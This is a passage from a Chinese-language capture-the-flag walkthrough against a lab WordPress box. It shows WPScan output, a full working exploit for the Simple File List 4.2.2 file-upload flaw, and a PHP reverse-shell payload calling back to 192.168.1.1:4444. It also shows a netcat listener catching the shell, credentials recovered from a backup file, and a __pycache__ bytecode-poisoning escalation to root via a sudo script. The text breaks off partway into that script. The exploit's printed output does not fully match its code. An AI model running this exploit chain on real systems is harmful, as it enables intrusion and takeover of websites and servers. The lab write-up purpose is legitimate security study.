https://wpscan.com/vulnerability/3436f5d4-f620-49f1-9e90-37883a8ad0dc<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39924<br> |      - https://patchstack.com/database/vulnerability/simple-file-list/wordpress-simple-file-list-plugin-6-1-9-cross-site-scripting-xss-vulnerability<br> |<br> | [!] Title: Simple File List &lt; 6.1.10 - Unauthenticated Arbitrary File Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 6.1.10<br> |     References:<br> |      - https://wpscan.com/vulnerability/c2121b69-2aed-4db4-8191-448deceab091<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44227<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7eada9b7-8d53-4e95-858e-aa706f74b2a1<br> |<br> | [!] Title: Simple File List &lt; 6.1.13 - Reflected Cross-Site Scripting<br> |     Fixed <span class="hljs-keyword">in</span>: 6.1.13<br> |     References:<br> |      - https://wpscan.com/vulnerability/9ee74a0f-83ff-4c15-a114-f8f6baab8bf5<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10146<br> |<br> | [!] Title: Simple File List &lt; 6.1.14 - Missing Authorization to Unauthenticated Minor Settings Update<br> |     Fixed <span class="hljs-keyword">in</span>: 6.1.14<br> |     References:<br> |      - https://wpscan.com/vulnerability/aedab3a9-cf83-4f69-a282-7d1b07176e95<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47450<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/207eedfc-8b42-49be-be7a-98da38ad7ee6<br> |<br> | [!] Title: Simple File List &lt; 6.1.15 - Unauthenticated Arbitrary File Download<br> |     Fixed <span class="hljs-keyword">in</span>: 6.1.15<br> |     References:<br> |      - https://wpscan.com/vulnerability/45956bfe-5c31-4e6b-b9a8-bd300cb82569<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-54021<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/dcbb6a4c-120f-43d1-8ec9-dac52186d81a<br> |<br> | [!] Title: Simple File List &lt;= 6.1.16 - Missing Authorization<br> |     References:<br> |      - https://wpscan.com/vulnerability/25b593ff-9e7e-43e8-b630-9fdd6f3548eb<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-68591<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8939cad2-f9fc-45aa-97d1-9a1a2a59bf94<br> |<br> | Version: 4.2.2 (100% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://192.168.2.67:3000/wp-content/plugins/simple-file-list/readme.txt<br> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)<br> |  - http://192.168.2.67:3000/wp-content/plugins/simple-file-list/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=======================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] VOCALOID NEXUS<br> | Found By: Oembed API - Author Name (Aggressive Detection)<br> |  - http://192.168.2.67:3000/wp-json/oembed/1.0/embed?url=http://192.168.2.67:3000/&amp;format=json<br><br>[+] admin<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] WPScan DB API OK<br> | Plan: free<br> | Requests Done (during the scan): 4<br> | Requests Remaining: 21<br><br>[+] Finished: Tue Feb  3 10:36:02 2026<br>[+] Requests Done: 65<br>[+] Cached Requests: 9<br>[+] Data Sent: 16.72 KB<br>[+] Data Received: 510.302 KB<br>[+] Memory used: 238.77 MB<br>[+] Elapsed <span class="hljs-keyword">time</span>: 00:00:17<br></code></pre></td></tr></table></figure>
+
+<p>发现存在<code>Simple File List</code>文件上传漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.exploit-db.com/exploits/48979<br></code></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Arbitrary File Upload</span><br><span class="hljs-comment"># Date: 2020-11-01</span><br><span class="hljs-comment"># Exploit Author: H4rk3nz0 based off exploit by coiffeur</span><br><span class="hljs-comment"># Original Exploit: https://www.exploit-db.com/exploits/48349</span><br><span class="hljs-comment"># Vendor Homepage: https://simplefilelist.com/</span><br><span class="hljs-comment"># Software Link: https://wordpress.org/plugins/simple-file-list/ </span><br><span class="hljs-comment"># Version: Wordpress v5.4 Simple File List v4.2.2 </span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib3<br>urllib3.disable_warnings()<br><br>dir_path = <span class="hljs-string">&#x27;/wp-content/uploads/simple-file-list/&#x27;</span><br>upload_path = <span class="hljs-string">&#x27;/wp-content/plugins/simple-file-list/ee-upload-engine.php&#x27;</span><br>move_path = <span class="hljs-string">&#x27;/wp-content/plugins/simple-file-list/ee-file-engine.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">usage</span>():<br>    banner = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE</span><br><span class="hljs-string">SYNOPSIS: python wp_simple_file_list_4.2.2.py &lt;URL&gt;</span><br><span class="hljs-string">AUTHOR: coiffeur</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(banner)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    filename = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10000</span>)&#125;</span>.png&#x27;</span><br>    password = hashlib.md5(<span class="hljs-built_in">bytearray</span>(random.getrandbits(<span class="hljs-number">8</span>)<br>                                     <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>))).hexdigest()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        payload = <span class="hljs-string">&#x27;&lt;?php passthru(&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1&quot;); ?&gt;&#x27;</span><br>        f.write(payload.encode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[ ] File <span class="hljs-subst">&#123;filename&#125;</span> generated with password: <span class="hljs-subst">&#123;password&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> filename, password<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url, filename</span>):<br>    files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (filename, <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;image/png&#x27;</span>)&#125;<br>    datas = &#123;<span class="hljs-string">&#x27;eeSFL_ID&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;eeSFL_FileUploadDir&#x27;</span>: dir_path,<br>             <span class="hljs-string">&#x27;eeSFL_Timestamp&#x27;</span>: <span class="hljs-number">1587258885</span>, <span class="hljs-string">&#x27;eeSFL_Token&#x27;</span>: <span class="hljs-string">&#x27;ba288252629a5399759b6fde1e205bc2&#x27;</span>&#125;<br>    r = requests.post(url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;upload_path&#125;</span>&#x27;</span>,<br>                      data=datas, files=files, verify=<span class="hljs-literal">False</span>)<br>    r = requests.get(url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;dir_path&#125;</span><span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[ ] File uploaded at <span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;dir_path&#125;</span><span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        os.remove(filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] Failed to upload <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> filename<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">url, filename</span>):<br>    new_filename = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;filename.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]&#125;</span>.php&#x27;</span><br>    headers = &#123;<span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/wp-admin/admin.php?page=ee-simple-file-list&amp;tab=file_list&amp;eeListID=1&#x27;</span>,<br>               <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>&#125;<br>    datas = &#123;<span class="hljs-string">&#x27;eeSFL_ID&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;eeFileOld&#x27;</span>: filename,<br>             <span class="hljs-string">&#x27;eeListFolder&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;eeFileAction&#x27;</span>: <span class="hljs-string">f&#x27;Rename|<span class="hljs-subst">&#123;new_filename&#125;</span>&#x27;</span>&#125;<br>    r = requests.post(url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;move_path&#125;</span>&#x27;</span>,<br>                      data=datas, headers=headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[ ] File moved to <span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;dir_path&#125;</span><span class="hljs-subst">&#123;new_filename&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] Failed to move <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> new_filename<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url</span>):<br>    file_to_upload, password = generate()<br>    uploaded_file = upload(url, file_to_upload)<br>    moved_file = move(url, uploaded_file)<br>    <span class="hljs-keyword">if</span> moved_file:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] Exploit seem to work.\n[*] Confirmning ...&#x27;</span>)<br>    datas = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&#x27;phpinfo();&#x27;</span>&#125;<br>    r = requests.post(url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;dir_path&#125;</span><span class="hljs-subst">&#123;moved_file&#125;</span>&#x27;</span>,<br>                      data=datas, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> r.text.find(<span class="hljs-string">&#x27;php&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Exploit work !&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\tURL: <span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;dir_path&#125;</span><span class="hljs-subst">&#123;moved_file&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\tPassword: <span class="hljs-subst">&#123;password&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>):<br>        usage()<br>        exit(-<span class="hljs-number">1</span>)<br>    main(sys.argv[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
+
+<p>进行利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/Nukem-PG-exploit]<br>└─# python exploit.py <span class="hljs-string">&quot;192.168.2.67:3000&quot;</span><br>[+] File renamed to reverse.png<br>[+] File uploaded at http://192.168.2.67:3000/wp-content/uploads/simple-file-list/reverse.png<br>[+] File moved to http://192.168.2.67:3000/wp-content/uploads/simple-file-list/reverse.php<br>[^-^] Exploit seems to have worked...<br>        URL: http://192.168.2.67:3000/wp-content/uploads/simple-file-list/reverse.php<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.67] 39374<br>Linux 949d50994487 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux</span><br> 09:04:35 up 35 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.05, 0.27, 0.23<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取miku权限"><a href="#1、获取miku权限" class="headerlink" title="1、获取miku权限"></a>1、获取miku权限</h2><p>发现是<code>docker</code>环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /<br>total 88<br>drwxr-xr-x   1 root root 4096 Jan 20 03:33 .<br>drwxr-xr-x   1 root root 4096 Jan 20 03:33 ..<br>-rwxr-xr-x   1 root root    0 Jan 20 03:33 .dockerenv<br>drwxr-xr-x   1 root root 4096 Dec 21  2021 bin<br>drwxr-xr-x   2 root root 4096 Dec 11  2021 boot<br>....<br></code></pre></td></tr></table></figure>
+
+<p>查看具有<code>suid</code>权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find / -<span class="hljs-built_in">type</span> f -perm -4000 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/passwd<br>/usr/local/lib/.sys_log_rotator<br>/bin/mount<br>/bin/su<br>/bin/umount<br></code></pre></td></tr></table></figure>
+
+<p>找到一个<code>/usr/local/lib/.sys_log_rotator</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /usr/local/lib/.sys_log_rotator -h<br>Usage: .sys_log_rotator [options] [file ...]<br><br>Reverse lines characterwise.<br><br>Options:<br> -h, --<span class="hljs-built_in">help</span>     display this <span class="hljs-built_in">help</span><br> -V, --version  display version<br><br>For more details see rev(1).<br></code></pre></td></tr></table></figure>
+
+<p>该文件就是<code>rev</code>，功能是一样的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ diff /usr/bin/rev /usr/local/lib/.sys_log_rotator<br></code></pre></td></tr></table></figure>
+
+<p>查看用户<code>miku</code>可读写的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find / -user miku 2&gt;/dev/null<br>/usr/local/lib/.sys_log_rotator<br>/var/www/html/wp-content/uploads/server_backup_info.txt<br></code></pre></td></tr></table></figure>
+
+<p>读取文件<code>server_backup_info.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /usr/local/lib/.sys_log_rotator /var/www/html/wp-content/uploads/server_backup_info.txt<br>01-10-5202 :etaD pukcaB<br>noitacifirev gnidneP :sutatS<br>:nimdasyS rof etoN<br>.<span class="hljs-string">&#x27;yotymorf&#x27;</span> tsoh rof slaitnederc yraropmet ot detreveR .deliaf noitator yek HSS ehT<br>ukim :resU<br>93_uk1M_di0lac0V :drowssaP<br><br>noitacifirev retfa <span class="hljs-keyword">elif</span> siht eteled esaelP :TRELA YTIRUCES<br></code></pre></td></tr></table></figure>
+
+<p>成功找到凭证：<code>miku:V0cal0id_M1ku_39</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh miku@192.168.2.67<br>miku@fromytoy:~$ <span class="hljs-built_in">id</span><br>uid=1000(miku) gid=1000(miku) <span class="hljs-built_in">groups</span>=1000(miku)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> miku on fromytoy:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User miku may run the following commands on fromytoy:<br>    (ALL) NOPASSWD: /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py<br></code></pre></td></tr></table></figure>
+
+<p>脚本分析：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ <span class="hljs-built_in">cat</span> /usr/local/lib/python_scripts/cleanup_task.py<br><span class="hljs-comment">#!/usr/bin/env python3</span><br>import sys<br>import os<br>import system_utils <br><br>def main():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Starting system cleanup...&quot;</span>)<br>    <span class="hljs-keyword">if</span> os.geteuid() != 0:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error: This script must be run as root.&quot;</span>)<br>        sys.exit(1)<br>    <br><br>    system_utils.check_disk_space()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Cleanup completed successfully.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>调用<code>system_utils</code>模块中的<code>check_disk_space</code>函数检查磁盘使用情况</p>
+<p>在<code>/usr/local/lib/python_scripts/</code>目录下，发现<code>system_utils.py</code>模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ find / -name <span class="hljs-string">&#x27;system_utils&#x27;</span> 2&gt;/dev/null<br>miku@fromytoy:~$ find / -name <span class="hljs-string">&#x27;*system_utils*&#x27;</span> 2&gt;/dev/null<br>/usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc<br>/usr/local/lib/python_scripts/system_utils.py<br></code></pre></td></tr></table></figure>
+
+<p>查看模块内容：这个模块调用了<code>os.system</code>执行shell命令<code>df-h</code>查看磁盘使用情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ <span class="hljs-built_in">cat</span> /usr/local/lib/python_scripts/system_utils.py<br>import os<br>def check_disk_space():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Checking disk usage...&quot;</span>)<br>    os.system(<span class="hljs-string">&quot;df -h&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><code>_pycache_</code>投毒 查看可写目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ find / -<span class="hljs-built_in">type</span> d -writable 2&gt;/dev/null | grep -Ev <span class="hljs-string">&#x27;^/run|^/proc|^/sys&#x27;</span><br>/dev/mqueue<br>/dev/shm<br>/usr/local/lib/python_scripts/__pycache__<br>/tmp<br>/tmp/.Test-unix<br>/tmp/.font-unix<br>/tmp/.ICE-unix<br>/tmp/.XIM-unix<br>/tmp/.X11-unix<br>/home/miku<br>/var/tmp<br>/var/lib/php/sessions<br></code></pre></td></tr></table></figure>
+
+<p><code>/usr/local/lib/python_scripts/__pycache__</code>是可写的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ <span class="hljs-built_in">ls</span> -la /usr/local/lib/python_scripts/           <br>total 20<br>drwxr-xr-x 3 root root 4096 Jan 19 22:50 .<br>drwxr-xr-x 5 root root 4096 Jan 19 22:40 ..<br>drwxrwxrwx 2 root root 4096 Jan 20 00:35 __pycache__<br>-rwxr-xr-x 1 root root  359 Jan 19 22:50 cleanup_task.py<br>-rw-r--r-- 1 root root   97 Jan 19 22:41 system_utils.py<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击原理：</strong> Python在导入模块时会优先使用<code>pycache</code>目录下的<code>.pyc</code>文件，并且会验证<code>.pyc</code>文件中的时间戳和源文件<code>.py</code>的时间戳是否一致，以及文件大小。如果一致，则使用缓存，否则重新编译在pyc文件的header部分，大小为16字节，包含魔数、时间戳和文件大小等信息。</p>
+<p>这个目录是可写的，所以可以删除掉root用户编译的字节码pyc文件，在tmp目录下编译生成恶意的<code>system_utils.py</code>文件，编译后移动到<code>/usr/local/lib/python_scripts/_pycache_/</code>目录下覆盖原有的 pyc文件，注意时间戳的问题</p>
+<p>编写恶意python文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ nano pwn.py <br>import os<br><br>def check_disk_space():<br>    os.system(<span class="hljs-string">&quot;cp /bin/bash /tmp/bash&quot;</span>)<br>    os.system(<span class="hljs-string">&quot;chmod +s /tmp/bash&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>编译文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ python3 /tmp/exp.py<br></code></pre></td></tr></table></figure>
+
+<p>删除原有的pyc文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:~$ <span class="hljs-built_in">rm</span> -rf /usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc<br>miku@fromytoy:~$ <span class="hljs-built_in">rm</span> -rf /usr/local/lib/python_scripts/__pycache__/cleanup_task.cpython-39.pyc<br></code></pre></td></tr></table></figure>
+
+<p>编写修正脚本头部元数据的 <code>exp.py</code> 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ nano exp.py <br>import struct<br>import 